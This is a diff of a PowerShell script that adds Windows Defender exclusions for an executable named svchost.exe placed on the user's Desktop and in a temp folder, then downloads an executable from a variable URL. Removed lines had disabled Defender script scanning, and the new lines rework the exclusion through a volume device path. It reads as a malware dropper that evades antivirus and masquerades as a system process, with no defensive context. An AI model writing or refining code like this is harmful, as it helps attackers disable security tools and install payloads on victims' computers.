@@ -37,11 +37,12 @@ Add-MpPreference -ExclusionPath $roamingTempSvchostExe
 Add-MpPreference -ExclusionPath $desktopPath
 Add-MpPreference -ExclusionPath $destination
 
+# Get the device path
+$devicePath = (Get-Volume).DevicePath | Where-Object { $_ -like "*HarddiskVolume3*" }
+
 # Add AMSI exception
-$amsiProvider = "Microsoft Defender Advanced Threat Protection"
-$exclusion = "Desktop\svchost.exe"
-$amsiCmd = "Set-MpPreference -DisableScriptScanning $true; Add-MpPreference -ExclusionProcess $exclusion"
-Invoke-Command -ScriptBlock { & $amsiCmd }
+$exclusionPath = Join-Path -Path $devicePath -ChildPath "Users\$env:USERNAME\Desktop\svchost.exe"
+Add-MpPreference -ExclusionPath $exclusionPath
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $destination
 
